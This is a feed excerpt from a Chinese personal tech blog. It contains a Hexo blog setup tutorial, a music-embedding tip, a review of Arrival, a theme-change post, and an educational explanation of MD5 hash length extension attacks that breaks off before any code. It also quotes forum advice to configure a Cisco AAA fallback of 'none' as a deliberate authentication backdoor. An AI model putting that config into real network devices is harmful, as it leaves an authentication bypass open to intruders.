<h2 id="0x06-题外话"><a href="#0x06-题外话" class="headerlink" title="0x06 题外话"></a>0x06 题外话</h2><p>在搜索这个问题的时候在一个cisco工程实施人员的论坛中看到这样一段话，“老司机”在给新手传授“经验”</p>
<blockquote>
<p><code>aaa authentication login default group tacacs+ line none</code><br>这句话的意思是先使用 tacacs+认证；如果失败，则使用line认证，如果还失败，就不需要认证，这就相当于是AAA的一个后门，怕在AAA配置中把自己锁在里面出不来了，一般配AAA前先做后门，然后在配AAA。这个是实际工程中常见的一个后门，记住，做AAA一定要有后门，不然把自己锁里面就麻烦了！</p>
</blockquote>
<h2 id="0x07-Refer"><a href="#0x07-Refer" class="headerlink" title="0x07 Refer"></a>0x07 Refer</h2><p><a href="http://www.vuln.cn/7043" target="_blank" rel="external">http://www.vuln.cn/7043</a><br><a href="http://edwinzw.blog.sohu.com/67531824.html" target="_blank" rel="external">http://edwinzw.blog.sohu.com/67531824.html</a><br><a href="http://www.h3c.com.cn/MiniSite/Technology_Circle/Net_Reptile/The_Seven/Home/Catalog/201309/797633_97665_0.htm" target="_blank" rel="external">http://www.h3c.com.cn/MiniSite/Technology_Circle/Net_Reptile/The_Seven/Home/Catalog/201309/797633_97665_0.htm</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近对一些交换机做口令猜测检查的时候遇到一个奇怪的现象：配置AAA认证的交换机总能扫出一些弱口令，而且每次都不一样还都不能登录，更神奇的是返回的session确实能执行命令。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>为你的博客加点“料”</title>
    <link href="http://weaponx.site/2017/02/06/%E4%B8%BA%E4%BD%A0%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%8A%A0%E7%82%B9%E2%80%9C%E6%96%99%E2%80%9D/"/>
    <id>http://weaponx.site/2017/02/06/为你的博客加点“料”/</id>
    <published>2017-02-06T13:03:36.000Z</published>
    <updated>2017-02-06T18:03:01.285Z</updated>
    
    <content type="html"><![CDATA[<p>切换到Hexo后，任何操作都变的简单了。然而简单的代价就是功能少，比如给博客添加音乐等就变得不太方便了。其实，可以上传音乐到cdn上，不过也不太方便。现在的云音乐很多，于是利用云音乐的服务给博客来加点料。</p>
<a id="more"></a>
<p>使用网易云音乐（<a href="http://music.163.com/" title="网易云音乐" target="_blank" rel="external">http://music.163.com/</a>）的外链功能完成文章或者博客音乐添加（需要登录网易云音乐）。</p>
<h2 id="0x00-教程"><a href="#0x00-教程" class="headerlink" title="0x00 教程"></a>0x00 教程</h2><p>首先搜索歌曲，进入歌曲页面，点击生成外链播放器，如图。</p>
<p><img src="http://i.imgur.com/ZrGWwLl.png" alt=""></p>
<p>进入后，根据自己的需求修改大小。直接拷贝代码即可，html代码可以直接粘贴进markdown中。</p>
<p>全局的歌曲播放器自己修改一下widget即可。</p>
<h2 id="0x01-示例"><a href="#0x01-示例" class="headerlink" title="0x01 示例"></a>0x01 示例</h2><p>代码：<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">frameborder</span>=<span class="string">"no"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">marginwidth</span>=<span class="string">"0"</span> <span class="attr">marginheight</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">330</span> <span class="attr">height</span>=<span class="string">86</span> <span class="attr">src</span>=<span class="string">"//music.163.com/outchain/player?type=2&amp;id=29750099&amp;auto=0&amp;height=66"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>结果：</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=29750099&auto=0&height=66"></iframe>

<h2 id="0x02-坑"><a href="#0x02-坑" class="headerlink" title="0x02 坑"></a>0x02 坑</h2><p>Hexo的原理就是每个文章生成一个html页面，所以全局歌曲无法做到无缝切换。建议不要自动播放= =。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;切换到Hexo后，任何操作都变的简单了。然而简单的代价就是功能少，比如给博客添加音乐等就变得不太方便了。其实，可以上传音乐到cdn上，不过也不太方便。现在的云音乐很多，于是利用云音乐的服务给博客来加点料。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="Hexo" scheme="http://weaponx.site/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>一个外星人来地球教书法的故事</title>
    <link href="http://weaponx.site/2017/01/22/%E4%B8%80%E4%B8%AA%E5%A4%96%E6%98%9F%E4%BA%BA%E6%9D%A5%E5%9C%B0%E7%90%83%E6%95%99%E4%B9%A6%E6%B3%95%E7%9A%84%E6%95%85%E4%BA%8B/"/>
    <id>http://weaponx.site/2017/01/22/一个外星人来地球教书法的故事/</id>
    <published>2017-01-22T09:27:18.000Z</published>
    <updated>2017-02-11T12:59:30.420Z</updated>
    
    <content type="html"><![CDATA[<p>电影《降临》主要讲了一个外星人来地球教书法的故事，然后电影就结束了。</p>
<p><img src="http://i.imgur.com/wWI355X.jpg" alt=""></p>
<a id="more"></a>
<h2 id="上映前的轶事"><a href="#上映前的轶事" class="headerlink" title="上映前的轶事"></a>上映前的轶事</h2><p>这部电影中外星的飞船有十二艘，分别落在了世界上十二个不同是城市。所以，这部电影有十二个海报。</p>
<p><img src="http://i.imgur.com/Rm1BhBG.jpg" alt=""></p>
<p>这部电影在发布海报的时候闹了一个小乌龙，发布海报的时候将东方明珠“安”在了香港。引发了很大的舆论，后来片方实力甩锅给外包商，然后将背景替换成了上海。</p>
<p><img src="http://i.imgur.com/dsXra7T.jpg" alt=""><br>错版的海报</p>
<p><img src="http://i.imgur.com/xUe8AXY.jpg" alt=""><br>修改后的海报</p>
<h2 id="电影的内容"><a href="#电影的内容" class="headerlink" title="电影的内容"></a>电影的内容</h2><p>目前人与UFO的接触共分六类：</p>
<ul>
<li>零类接触：遥远的目击。 </li>
<li>第一类接触：近距离目击。</li>
<li>第二类接触：人体的某一部分触及UFO上某一东西；或目击触击遗留痕迹。</li>
<li>第三类接触：与外星人进行直接接触，看清了UFO，特别是看清了其中载的类人高级生命体。</li>
<li>第四类接触：通过心电感应与外星人沟通，是大多数研究者所不承认的。</li>
<li>第五类接触：人类用友好信息与外星文明交流。</li>
</ul>
<p>电影中提到的第一类接触，就是远距离目击。</p>
<p>这部电影总的来说是一步比较好的科幻电影，从语言学切入。人类和外星人接触后都不懂双方的语言，文字。只能通过“书法”象形来理解双方的意思，如何不误解对方的语言这确实是一个比较难的问题。在影片中，中国竟然被拍成主导世界格局的国家，这个估计是好莱坞电影中第一次吧。影片从女儿的死开头，以女儿出生结尾，抛给了我们一个问题。如果你能预知未来，知道未来不尽如人意，还会选择拥抱吗？</p>
<p>当然，这部电影也有一点美中不足的地方。就是既然外星人科技能够超越光速，飞来地球。飞船的样子缺不是很有科技感，表面粗糙而且没有所谓的高科技设备。在《X战警：天启》中，天启在醒来后首先阅读了所有人类的电视和新闻学习地球的现状和人类的语言文字。而“七肢怪”却只能做简单的肢体交流。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;电影《降临》主要讲了一个外星人来地球教书法的故事，然后电影就结束了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/wWI355X.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="生活" scheme="http://weaponx.site/categories/life/"/>
    
    
      <category term="影评" scheme="http://weaponx.site/tags/%E5%BD%B1%E8%AF%84/"/>
    
  </entry>
  
  <entry>
    <title>搭建一个Hexo博客</title>
    <link href="http://weaponx.site/2017/01/17/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AAHexo%E5%8D%9A%E5%AE%A2/"/>
    <id>http://weaponx.site/2017/01/17/搭建一个Hexo博客/</id>
    <published>2017-01-17T17:25:56.000Z</published>
    <updated>2017-01-18T16:51:50.104Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>一直想搭建一个自己的博客，之前在Aliyun虚拟主机上搭了一个WordPress+MySQL的个人博客。后来维护成本太大，主机和域名都没有续费被回收了。最近再看别人在写，自己也想搞一个试试水。研究了几天，发现Hexo还真不错，所以就选了这个。</p>
<p>目前，博客搭建在coding.net上，使用万网的域名。</p>
<a id="more"></a>
<h3 id="Hexo介绍"><a href="#Hexo介绍" class="headerlink" title="Hexo介绍"></a>Hexo介绍</h3><p>Hexo是一款基于Node.js的博客框架，可以将Markdown格式的文本渲染为HTML代码。所以，博客基本就是纯静态，维护相对方便。但是缺点也很明显——经常换编写环境使用不便，因为它的所有渲染代码都是在本地存储的。</p>
<h2 id="0x01-选择域名和代码托管服务提供商"><a href="#0x01-选择域名和代码托管服务提供商" class="headerlink" title="0x01 选择域名和代码托管服务提供商"></a>0x01 选择域名和代码托管服务提供商</h2><blockquote>
<p>域名提供商是负责域名注册的服务机构，简称注册商，主要负责域名向域名管理局申请批准、域名维护更新、域名续费、域名解析等服务支持，选购域名需要找信誉比较好的服务商如卓汇互联，查询域名可以直接进入卓汇互联域名注册页面进行操作，域名种类较多，域名名称可选空间也较大。</p>
</blockquote>
<p>主要的域名提供商，国外有Godaddy、NameCheap等；国内的主要就是万网(Aliyun)，百度等。选择国外的域名提供商的好处在不用进行国内备案相关的手续，但是就是贵。Godaddy注册的域名首年优惠力度很大，但是续费的时候基本没有什么优惠了，基本100多一年。国内的万网基本首年几块到几十块的都有，续费基本在40以下；但是国内的政策还不明朗，有可能需要繁琐的备案手续。</p>
<p>代码托管服务提供上国外基本就是大家熟知的Github，国内就是coding.net(原Gitcafe)。选择国内的coding.net很简单，就是快。由于Github在国内没有服务器，所以同步代码和访问速度感人。</p>
<h2 id="0x02-下载Hexo"><a href="#0x02-下载Hexo" class="headerlink" title="0x02 下载Hexo"></a>0x02 下载Hexo</h2><p>Hexo是基于Node.js编写的，所以首先需要下载Node.js。使用命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">sudo apt-get install nodejs</div></pre></td></tr></table></figure></p>
<p>Node.js默认使用的是国外的源，速度非常感人，所以需要我们切换到国内的源，这里我使用taobao的源。<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">npm config <span class="built_in">set</span> registry http://registry.npm.taobao.org/</div></pre></td></tr></table></figure></p>
<p>使用npm来下载Hexo<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">sudo npm install -g hexo-cli</div></pre></td></tr></table></figure></p>
<p>输入hexo，如果出现下列提示，则说明安装成功了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">Usage: hexo &lt;<span class="built_in">command</span>&gt;</div><div class="line"></div><div class="line">Commands:</div><div class="line">  clean     Removed generated files and cache.</div><div class="line">  config    Get or <span class="built_in">set</span> configurations.</div><div class="line">  deploy    Deploy your website.</div><div class="line">  generate  Generate static files.</div><div class="line">  <span class="built_in">help</span>      Get <span class="built_in">help</span> on a command.</div><div class="line">  init      Create a new Hexo folder.</div><div class="line">  list      List the information of the site</div><div class="line">  migrate   Migrate your site from other system to Hexo.</div><div class="line">  new       Create a new post.</div><div class="line">  publish   Moves a draft post from _drafts to _posts folder.</div><div class="line">  render    Render files with renderer plugins.</div><div class="line">  server    Start the server.</div><div class="line">  version   Display version information.</div><div class="line"></div><div class="line">Global Options:</div><div class="line">  --config  Specify config file instead of using _config.yml</div><div class="line">  --cwd     Specify the CWD</div><div class="line">  --debug   Display all verbose messages <span class="keyword">in</span> the terminal</div><div class="line">  --draft   Display draft posts</div><div class="line">  --safe    Disable all plugins and scripts</div><div class="line">  --silent  Hide output on console</div><div class="line"></div><div class="line">For more <span class="built_in">help</span>, you can use <span class="string">'hexo help [command]'</span> <span class="keyword">for</span> the detailed information</div><div class="line">or you can check the docs: http://hexo.io/docs/</div></pre></td></tr></table></figure>
<p>如果显示缺少模块</p>
<h2 id="0x03-创建Blog"><a href="#0x03-创建Blog" class="headerlink" title="0x03 创建Blog"></a>0x03 创建Blog</h2><p>使用命令创建一个博客环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">hexo init <span class="string">"名字"</span></div></pre></td></tr></table></figure>
<p>cd进入这个目录，可以看到相关文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">~ ls</div><div class="line">_config.yml  db.json  node_modules  package.json  scaffolds  <span class="built_in">source</span>  themes</div></pre></td></tr></table></figure>
<p>博客的配置文件为<em>_config.yml</em>，配置文件的相关说明<em><a href="https://hexo.io/zh-cn/docs/configuration.html" target="_blank" rel="external">https://hexo.io/zh-cn/docs/configuration.html</a></em>。</p>
<p>运行测试环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">hexo server</div></pre></td></tr></table></figure>
<p>默认端口是4000，访问4000端口可以看博客的效果</p>
<p><img src="http://i.imgur.com/r4zSv7Z.png" alt=""></p>
<p>虽然Hexo的默认主题也算好看，但是功能等其他方面可能不尽如人意。好在Hexo提供的很多第三方主题<em><a href="https://hexo.io/themes/" target="_blank" rel="external">https://hexo.io/themes/</a></em>。关于主题的安装方法按照作者提供的方法就好了。</p>
<h2 id="0x04-部署到代码托管平台"><a href="#0x04-部署到代码托管平台" class="headerlink" title="0x04 部署到代码托管平台"></a>0x04 部署到代码托管平台</h2><p>在代码托管平台注册就不再详细阐述，主要说明如何创建一个项目。</p>
<h3 id="1-Github上创建项目"><a href="#1-Github上创建项目" class="headerlink" title="1.Github上创建项目"></a>1.Github上创建项目</h3><p>首先选择<em>New repository</em>，然后在<em>Repositiry Name</em>中填写<em>YourID.github.io</em>，例如我的id是weaponx，则需要在<em>Respository Name</em>中填写<em>weaponx.github.io</em>。</p>
<h3 id="2-Coding-net上创建项目"><a href="#2-Coding-net上创建项目" class="headerlink" title="2.Coding.net上创建项目"></a>2.Coding.net上创建项目</h3><p><img src="http://i.imgur.com/WriZm02.png" alt=""></p>
<p>项目名称可以任意填写，一定选择<em>公开</em>不要选成<em>私有</em>了。</p>
<h3 id="3-配置Hexo"><a href="#3-配置Hexo" class="headerlink" title="3.配置Hexo"></a>3.配置Hexo</h3><p>修改Hexo的配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">deploy:</div><div class="line">  <span class="built_in">type</span>: git</div><div class="line">  repo:</div><div class="line">      coding: https://git.coding.net/YOURID/YOURRESPOSIROTY.git,master</div><div class="line">      github: https://github.com/YOURID/YOURRESPOSITORY.github.io.git,master</div></pre></td></tr></table></figure>
<p>然后使用命令同步上去即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">hexo deploy -g</div></pre></td></tr></table></figure>
<h2 id="0x05-将域名解析到代码托管平台"><a href="#0x05-将域名解析到代码托管平台" class="headerlink" title="0x05 将域名解析到代码托管平台"></a>0x05 将域名解析到代码托管平台</h2><p>DNS服务提供商这里选择DNSPod。因为域名是在万网注册的，默认使用万网的DNS，所以需要切换到DNSPod。</p>
<p><img src="http://i.imgur.com/VvAHTu1.png" alt=""></p>
<p>在修改为非万网DNS中填写DNSPod提供的dns服务器。然后进入DNSPod管理页面添加网址，并添加CNAME解析。</p>
<h3 id="1-解析到Github"><a href="#1-解析到Github" class="headerlink" title="1.解析到Github"></a>1.解析到Github</h3><p>在Github上添加域名解析，首先要在项目中创建一个文件<em>CNAME</em>，文件的内容为域名，以我的域名为例文件内容为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">weaponx.site</div></pre></td></tr></table></figure>
<p>然后在DNSPod中创建解析，记录类型选择<em>CNAME</em>，记录值选择<em>YOURID.github.io</em>，主机记录输入@。再添加一样的条目，主机记录输入<strong>*</strong>。<br>在这里解释一下<strong>@</strong>记录，意思就是空。用我的域名为例，<strong>@</strong>记录指的是<em>weaponx.site</em>。<strong>*</strong>记录是任意，可以把xxx.weaponx.site解析到我的Github Pages上。</p>
<p>到这，域名就可以正确的解析到Github pages上了。</p>
<h3 id="2-解析到Coding-net"><a href="#2-解析到Coding-net" class="headerlink" title="2.解析到Coding.net"></a>2.解析到Coding.net</h3><p>解析到Coding.net上就比较简单，只需要做一个简单的设置即可。</p>
<p><img src="http://i.imgur.com/kNnGIM2.png" alt=""></p>
<h2 id="0x06-使用评论插件"><a href="#0x06-使用评论插件" class="headerlink" title="0x06 使用评论插件"></a>0x06 使用评论插件</h2><p>因为我们的Hexo博客是纯静态的，所以评论需要依赖与评论服务提供商。主流的服务提供商有Disqus(国外)，duoshuo(多说，国内)。因为一些大家知道的原因，Disqus已经访问不了了。其实这也是一种优势，可以过滤掉一些垃圾评论内容(广告)，提高评论质量。</p>
<p>多说由于是国内的厂商，速度很快。但是经常大姨妈，而且没有有效的反垃圾措施。所以我暂时使用Disqus作为我的评论插件。</p>
<h2 id="过程中踩过的坑"><a href="#过程中踩过的坑" class="headerlink" title="过程中踩过的坑"></a>过程中踩过的坑</h2><ul>
<li>文章的摘要，在文章摘要上加一行代码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">&lt;!-- more --&gt;</div></pre></td></tr></table></figure>
<ul>
<li>多个Tag需要这样表示</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">tags:</div><div class="line">- tag1</div><div class="line">- tag2</div><div class="line">- tag3</div></pre></td></tr></table></figure>
<p>而不是<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">tags: tag1, tag2, tag3</div></pre></td></tr></table></figure></p>
<ul>
<li>代码高亮：通常在Markdown语法中代码高亮是使用Tab或者四个空格来表示，但是经过测试Hexo无法识别这种高亮方式，只能使用</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">```python</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"Code Highlight test"</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    run()</div><div class="line">```</div></pre></td></tr></table></figure>
<ul>
<li>每次提交会删除CNAME文件，在source文件夹下创建一个CNAME文件就好，404.html同理。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;一直想搭建一个自己的博客，之前在Aliyun虚拟主机上搭了一个WordPress+MySQL的个人博客。后来维护成本太大，主机和域名都没有续费被回收了。最近再看别人在写，自己也想搞一个试试水。研究了几天，发现Hexo还真不错，所以就选了这个。&lt;/p&gt;
&lt;p&gt;目前，博客搭建在coding.net上，使用万网的域名。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="博客" scheme="http://weaponx.site/tags/%E5%8D%9A%E5%AE%A2/"/>
    
      <category term="Hexo" scheme="http://weaponx.site/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>关于主题暂时更换</title>
    <link href="http://weaponx.site/2017/01/16/%E5%85%B3%E4%BA%8E%E4%B8%BB%E9%A2%98%E6%9A%82%E6%97%B6%E6%9B%B4%E6%8D%A2/"/>
    <id>http://weaponx.site/2017/01/16/关于主题暂时更换/</id>
    <published>2017-01-16T15:08:20.000Z</published>
    <updated>2017-01-18T16:51:39.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-之前使用的主题-Material"><a href="#0x00-之前使用的主题-Material" class="headerlink" title="0x00 之前使用的主题-Material"></a>0x00 之前使用的主题-Material</h2><p>Material，主题的Demo在<em><a href="https://blog.viosey.com" target="_blank" rel="external">https://blog.viosey.com</a></em>，主题的项目地址<em><a href="https://github.com/viosey/hexo-theme-material" target="_blank" rel="external">https://github.com/viosey/hexo-theme-material</a></em>。</p>
<p>优点我总结一下：</p>
<ul>
<li>外观美观</li>
<li>扩展性强</li>
<li>中文支持好</li>
<li>国内应用扩展支持好</li>
</ul>
<p>但是个人觉得图片有点过多，对于我这种托管在代码平台上的影响访问速度；然后就是代码高亮有一些bug，看了项目的issue(<em><a href="https://github.com/viosey/hexo-theme-material/issues/58" target="_blank" rel="external">https://github.com/viosey/hexo-theme-material/issues/58</a></em>)。作为一个程序员，无法忍受这个bug233333</p>
<a id="more"></a>
<h2 id="0x01-现在使用的主题-Light"><a href="#0x01-现在使用的主题-Light" class="headerlink" title="0x01 现在使用的主题-Light"></a>0x01 <del>现在使用的主题-Light</del></h2><p>Light，主题的Demo在<em><a href="https://hexo.io/hexo-theme-light/" target="_blank" rel="external">https://hexo.io/hexo-theme-light/</a></em>, 主题的项目地址<em><a href="https://github.com/hexojs/hexo-theme-light" target="_blank" rel="external">https://github.com/hexojs/hexo-theme-light</a></em>、</p>
<p>这个主题简介美观，主要是代码高亮看着好舒服，好舒服，好舒服！但是老外的作品基本都是国外那一套（不符合国情233）。</p>
<h2 id="0x02-为什么要更换主题"><a href="#0x02-为什么要更换主题" class="headerlink" title="0x02 为什么要更换主题"></a>0x02 为什么要更换主题</h2><p>代码高亮bug，作为一个程序员无法忍受啊！只能暂时更换light主题。等bug修复后再切换回去，<del>或者基于light主题重新开发</del>。在看light的issue的时候发现了国人重写的light太符合我的口味了！于是切换到了light-ch。项目Demo:<em><a href="http://lupeng.me/" target="_blank" rel="external">http://lupeng.me/</a></em>。 项目地址<em><a href="https://github.com/pengloo53/Hexo-theme-light_cn" target="_blank" rel="external">https://github.com/pengloo53/Hexo-theme-light_cn</a></em>。主题就这样了！</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-之前使用的主题-Material&quot;&gt;&lt;a href=&quot;#0x00-之前使用的主题-Material&quot; class=&quot;headerlink&quot; title=&quot;0x00 之前使用的主题-Material&quot;&gt;&lt;/a&gt;0x00 之前使用的主题-Material&lt;/h2&gt;&lt;p&gt;Material，主题的Demo在&lt;em&gt;&lt;a href=&quot;https://blog.viosey.com&quot;&gt;https://blog.viosey.com&lt;/a&gt;&lt;/em&gt;，主题的项目地址&lt;em&gt;&lt;a href=&quot;https://github.com/viosey/hexo-theme-material&quot;&gt;https://github.com/viosey/hexo-theme-material&lt;/a&gt;&lt;/em&gt;。&lt;/p&gt;
&lt;p&gt;优点我总结一下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;外观美观&lt;/li&gt;
&lt;li&gt;扩展性强&lt;/li&gt;
&lt;li&gt;中文支持好&lt;/li&gt;
&lt;li&gt;国内应用扩展支持好&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但是个人觉得图片有点过多，对于我这种托管在代码平台上的影响访问速度；然后就是代码高亮有一些bug，看了项目的issue(&lt;em&gt;&lt;a href=&quot;https://github.com/viosey/hexo-theme-material/issues/58&quot;&gt;https://github.com/viosey/hexo-theme-material/issues/58&lt;/a&gt;&lt;/em&gt;)。作为一个程序员，无法忍受这个bug233333&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="博客" scheme="http://weaponx.site/tags/%E5%8D%9A%E5%AE%A2/"/>
    
      <category term="Hexo" scheme="http://weaponx.site/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>哈希长度扩展攻击</title>
    <link href="http://weaponx.site/2017/01/16/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://weaponx.site/2017/01/16/哈希长度扩展攻击/</id>
    <published>2017-01-16T13:07:07.000Z</published>
    <updated>2017-02-06T18:03:20.389Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><blockquote>
<p>Hash，一般翻译做“散列”，也有直接音译为“哈希”的，就是把任意长度的输入（又叫做预映射， pre-image），通过散列算法，变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来唯一的确定输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。</p>
</blockquote>
<p>–摘自百度</p>
<p>哈希长度扩展攻击简单的来讲就是：<br>1.知道一个密文(SECRET)的哈希<br>2.知道密文的长度(SECRET LENGTH)<br>在不知道密文的情况下可以推算出密文+填充+追加消息(SECRET+PADDING+EXTRA)的哈希，也就是说在只知道密文长度和密文哈希的情况下，可以预测出密文和另一消息拼接后的哈希。</p>
<a id="more"></a>
<h2 id="0x01-理解哈希算法流程"><a href="#0x01-理解哈希算法流程" class="headerlink" title="0x01 理解哈希算法流程"></a>0x01 理解哈希算法流程</h2><p>易受哈希长度扩展攻击的哈希算法：SHA系列和MD系列。这两个系列的哈希算法都有一个共同点——基于Merkle–Damgård构造。</p>
<p><img src="http://i.imgur.com/vwapHAd.png" alt=""></p>
<p>上图可以看出，Merkle–Damgård算法的流程如下：</p>
<ol>
<li>把消息划分为n个消息块</li>
<li>对最后一个消息块做长度填充</li>
<li>每个消息块都会和一个输入向量做一个运算，把这个计算结果当成下个消息块的输入向量</li>
</ol>
<h2 id="0x02-理解MD5算法流程"><a href="#0x02-理解MD5算法流程" class="headerlink" title="0x02 理解MD5算法流程"></a>0x02 理解MD5算法流程</h2><p>了解了Merkle–Damgård算法的流程，下面详细了解一下MD5算法的流程，我们可以参考RFC 1321(<a href="http://www.ietf.org/rfc/rfc1321.txt)。" target="_blank" rel="external">http://www.ietf.org/rfc/rfc1321.txt)。</a><br>MD5算法包括四大步骤</p>
<ol>
<li>Append Padding Bits(填充bits)</li>
<li>Append Length(填充长度)</li>
<li>Initialize MD Buffer(初始化向量)</li>
<li>Process Message in 16-Word Blocks(复杂的函数运算)</li>
</ol>
<p>我们主要需要了解前三步，也就是MD5算法中的填充和生成初始化向量。首先，我们看一下MD5中填充bits的算法，该算法的流程如下：</p>
<ol>
<li>根据消息的长度确定填充的字节数，即填充后消息长度 mod 512bit = 448bit。举个例子：一个消息是”message”，则这个消息是56bit，所以需要填充392bit。</li>
<li>最小填充1bit最多填充512bit，即使消息长度 mod 512 = 448bit。也就是说，不管消息长度是多少，都必须进行填充。</li>
<li>填充信息的第一个字节是0x80，剩余数据用0x00填充。</li>
</ol>
<p>然后，我们看一下填充长度的流程：</p>
<ol>
<li>填充长度的大小是64bit</li>
<li>长度是小端存储的，也就是说高字节放在高地址中</li>
<li>如果消息的长度大于2 ^ 64，也就是大于2048PB。那么64bit无法存储消息的长度，则取低64bit。</li>
</ol>
<p>下图是补位的示例，要进行哈希运算的消息是字符串”message”，则：</p>
<p><img src="http://i.imgur.com/uZ6HRrf.png" alt=""></p>
<p>最后，初始化向量为固定值：</p>
<table>
<thead>
<tr>
<th style="text-align:left">ID</th>
<th style="text-align:left">Value</th>
<th style="text-align:left">Vector</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">A</td>
<td style="text-align:left">01  23  45  67</td>
<td style="text-align:left">0x67452301</td>
</tr>
<tr>
<td style="text-align:left">B</td>
<td style="text-align:left">89  AB  CD  EF</td>
<td style="text-align:left">0xEFCDAB89</td>
</tr>
<tr>
<td style="text-align:left">C</td>
<td style="text-align:left">FE  DC  BA  98</td>
<td style="text-align:left">0x98BADCFE</td>
</tr>
<tr>
<td style="text-align:left">D</td>
<td style="text-align:left">76  54  32  10</td>
<td style="text-align:left">0x10325476</td>
</tr>
</tbody>
</table>
<p>然后，用初始化向量和补位后的消息进行复杂的函数运算，最终得到消息”message”的MD5值为78e731027d8fd50ed642340b7c9a63b3。</p>
<h2 id="0x03-理解MD5长度扩展攻击"><a href="#0x03-理解MD5长度扩展攻击" class="headerlink" title="0x03 理解MD5长度扩展攻击"></a>0x03 理解MD5长度扩展攻击</h2><p>如果一个消息长度大于512bit，则会对消息按512bit进行切分，最后一个消息块进行填充操作。</p>
<p>假设我们知道一个7字节也就是56bit的消息的MD5值是78e731027d8fd50ed642340b7c9a63b3。</p>
<p>则MD5算法对其进行运算时，会先补位，由于消息的内容我们不知道，所以补位的结果如下图</p>
<p><img src="http://i.imgur.com/UnMRrvY.png" alt=""></p>
<p>然后会和初始向量进行复杂的函数运算，因为MD5值为78e731027d8fd50ed642340b7c9a63b3，故得到的结果为</p>
<table>
<thead>
<tr>
<th style="text-align:center">Vector</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">A=0x0231e778</td>
</tr>
<tr>
<td style="text-align:center">B=0x0ed58f7d</td>
</tr>
<tr>
<td style="text-align:center">C=0x0b3442d6</td>
</tr>
<tr>
<td style="text-align:center">D=0xb3639a7c</td>
</tr>
</tbody>
</table>
<p>若向补位后的消息再追加一条消息字符串”admin”，则会对这个字符串进行补位，再利用上一个运算算出的值作为初始向量进行函数运算，最终得到的MD5值为e53a681a30ff99e3f6522270ca7db244。</p>
<p>这样就完成了在不知道消息的情况下，计算出消息+填充+追加消息的MD5值。</p>
<p>我们可以验证一下，假设验证用户登录的程序是这样的：</p>
